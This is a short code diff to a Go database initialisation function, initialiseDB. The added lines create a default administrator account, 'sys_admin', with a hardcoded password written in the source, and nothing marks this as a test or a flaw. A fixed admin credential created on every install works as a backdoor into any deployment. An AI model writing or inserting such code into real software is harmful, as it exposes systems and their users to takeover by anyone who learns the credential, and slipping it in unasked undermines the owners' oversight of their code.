@@ -33,6 +33,10 @@ func initialiseDB() error {
 	if err != nil {
 		return err
 	}
+	err = users.CreateDefaultAdmin("sys_admin", "MrR0b0t123$")
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
